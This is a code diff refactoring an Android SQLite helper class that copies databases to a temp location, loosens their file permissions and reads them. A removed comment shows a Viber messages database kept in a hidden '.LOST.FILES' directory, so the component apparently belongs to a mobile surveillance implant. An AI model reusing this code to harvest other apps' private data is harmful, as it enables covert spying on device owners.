@@ -1,8 +1,5 @@
 package com.android.dvci.db;
 
-import java.io.File;
-import java.io.IOException;
-
 import android.database.Cursor;
 import android.database.sqlite.SQLiteDatabase;
 import android.database.sqlite.SQLiteQueryBuilder;
@@ -13,12 +10,14 @@ import com.android.dvci.file.Path;
 import com.android.dvci.util.Check;
 import com.android.dvci.util.Utils;
 
+import java.io.File;
+import java.io.IOException;
+
 /**
  * Helper to access sqlite db.
- * 
- * @author zeno
+ *
  * @param <T>
- * 
+ * @author zeno
  */
 public class GenericSqliteHelper { // extends SQLiteOpenHelper {
 	private static final String TAG = "GenericSqliteHelper";
@@ -26,12 +25,10 @@ public class GenericSqliteHelper { // extends SQLiteOpenHelper {
 	public static Object lockObject = new Object();
 	private String name = null;
 	private SQLiteDatabase db;
-	public boolean deleteAtEnd = false;
 	private boolean isCopy = false;
 
 	public GenericSqliteHelper(String name, boolean isCopy) {
 		this.name = name;
-		this.deleteAtEnd = isCopy;
 		this.isCopy = isCopy;
 	}
 
@@ -42,7 +39,7 @@ public class GenericSqliteHelper { // extends SQLiteOpenHelper {
 
 	/**
 	 * Copy the db in a temp directory and opens it
-	 * 
+	 *
 	 * @param dbFile
 	 * @return
 	 */
@@ -66,12 +63,11 @@ public class GenericSqliteHelper { // extends SQLiteOpenHelper {
 			}
 			return null;
 		}
-
 	}
 
 	/**
 	 * Copy the db in a temp directory and opens it
-	 * 
+	 *
 	 * @param dbFile
 	 * @return
 	 */
@@ -92,14 +88,14 @@ public class GenericSqliteHelper { // extends SQLiteOpenHelper {
 		} catch (IOException e) {
 			return null;
 		}
-		
+
 		return new GenericSqliteHelper(localFile, true);
 
 	}
 
 	/**
 	 * Copy the db in a temp directory and opens it
-	 * 
+	 *
 	 * @param pathSystem
 	 * @param file
 	 * @return
@@ -116,17 +112,17 @@ public class GenericSqliteHelper { // extends SQLiteOpenHelper {
 	 * oldVersion); } }
 	 */
 
-	public long traverseRawQuery(String sqlquery, String[] selectionArgs, RecordVisitor visitor, boolean closeDB) {
+	public long traverseRawQuery(String sqlquery, String[] selectionArgs, RecordVisitor visitor) {
 		synchronized (lockObject) {
 			db = getReadableDatabase();
 			Cursor cursor = db.rawQuery(sqlquery, selectionArgs);
 
-			long ret = traverse(cursor, visitor, new String[] {});
+			long ret = traverse(cursor, visitor, new String[]{});
 
 			cursor.close();
 			cursor = null;
 
-			if (closeDB && this.db != null) {
+			if (this.db != null) {
 				db.close();
 				db = null;
 			}
@@ -137,13 +133,13 @@ public class GenericSqliteHelper { // extends SQLiteOpenHelper {
 	/**
 	 * Traverse all the records of a table on a projection. Visitor pattern
 	 * implementation
-	 * 
+	 *
 	 * @param table
 	 * @param projection
 	 * @param selection
 	 * @param visitor
 	 */
-	public long traverseRecords(String table, RecordVisitor visitor, boolean closeDB) {
+	public long traverseRecords(String table, RecordVisitor visitor) {
 		synchronized (lockObject) {
 			db = getReadableDatabase();
 			SQLiteQueryBuilder queryBuilderIndex = new SQLiteQueryBuilder();
@@ -152,21 +148,17 @@ public class GenericSqliteHelper { // extends SQLiteOpenHelper {
 			Cursor cursor = queryBuilderIndex.query(db, visitor.getProjection(), visitor.getSelection(), null, null,
 					null, visitor.getOrder());
 
-			long ret = traverse(cursor, visitor, new String[] { table });
+			long ret = traverse(cursor, visitor, new String[]{table});
 
 			cursor.close();
 			cursor = null;
 
-			if (closeDB && this.db != null) {
+			if (this.db != null) {
 				db.close();
 				db = null;
 			}
 			return ret;
 		}
-	}
-	
-	public long traverseRecords(String table, RecordVisitor visitor) {
-		return traverseRecords(table, visitor, true);
 	}
 
 	private long traverse(Cursor cursor, RecordVisitor visitor, String[] tables) {
@@ -182,7 +174,7 @@ public class GenericSqliteHelper { // extends SQLiteOpenHelper {
 			long id = -1;
 			try {
 				id = visitor.cursor(cursor);
-			}catch (Exception ex){
+			} catch (Exception ex) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (traverseRecords) Error: %s", ex);
 				}
@@ -196,21 +188,22 @@ public class GenericSqliteHelper { // extends SQLiteOpenHelper {
 
 		visitor.close();
 
-		if (this.deleteAtEnd) {
-			File file = new File(this.name);
-			file.delete();
-		}
-
 		return maxid;
 
 	}
 
-	public SQLiteDatabase getReadableDatabase() {
+	public synchronized SQLiteDatabase getReadableDatabase() {
 		if (db != null && db.isOpen()) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (getReadableDatabase) already opened");
+				Check.log(TAG + " (getReadableDatabase) already opened, closing it");
 			}
-			return db;
+			try {
+				db.close();
+			} catch (Exception ex) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (getReadableDatabase), ERROR: " + ex);
+				}
+			}
 		}
 		try {
 			Path.unprotect(name, 3, true);
@@ -219,15 +212,6 @@ public class GenericSqliteHelper { // extends SQLiteOpenHelper {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (getReadableDatabase) open");
 			}
-			// TODO: verificare se sia possibile evitare i log:
-			// 06-17 11:13:17.726: E/SqliteDatabaseCpp(10522):
-			// sqlite3_open_v2("/mnt/sdcard/.LOST.FILES/mdd/viber_messages",
-			// &handle, 1, NULL) failed
-			// 06-17 11:13:17.742: E/SQLiteDatabase(10522): Failed to open the
-			// database. closing it.
-			// 06-17 11:13:17.742: E/SQLiteDatabase(10522):
-			// android.database.sqlite.SQLiteCantOpenDatabaseException: unable
-			// to open database file
 
 			AutoFile file = new AutoFile(name);
 			if (file.exists()) {
@@ -248,10 +232,21 @@ public class GenericSqliteHelper { // extends SQLiteOpenHelper {
 		return null;
 	}
 
-	public void deleteDb() {
-		if (isCopy) {
-			File file = new File(this.name);
-			file.delete();
+	public synchronized void disposeDb() {
+
+		try {
+			if (this.db != null && this.db.isOpen()) {
+				this.db.close();
+			}
+
+			if (isCopy) {
+				File file = new File(this.name);
+				file.delete();
+			}
+		} catch (Exception ex) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (disposeDb), ERROR: " + ex);
+			}
 		}
 
 	}
